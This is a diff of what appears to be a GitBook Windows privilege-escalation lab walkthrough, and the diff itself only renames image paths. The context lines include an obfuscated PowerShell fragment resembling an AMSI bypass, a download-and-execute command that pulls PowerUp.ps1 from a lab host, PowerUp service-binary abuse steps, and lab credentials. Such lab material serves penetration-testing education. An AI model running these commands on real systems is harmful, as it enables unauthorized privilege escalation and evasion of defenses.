@@ -104,7 +104,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 iex (iwr http://192.168.248.2:8090/PowerUp.ps1 -usebasicparsing)
 ```
 
-![](<../../../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png>)
 
 4\. Execute `Invoke-AllChecks` to run all the checks from `PowerUp`.
 
@@ -139,7 +139,7 @@ Write-ServiceBinary -ServiceName 'Service' -ServicePath 'C:\Program Files\bin fo
 
 ![](<../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1).png>)
 
-![](<../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png>)
 
 9\. Start a new PowerShell session as Administrator and fill in the credentials `privesc:Welcome2022!`.
 
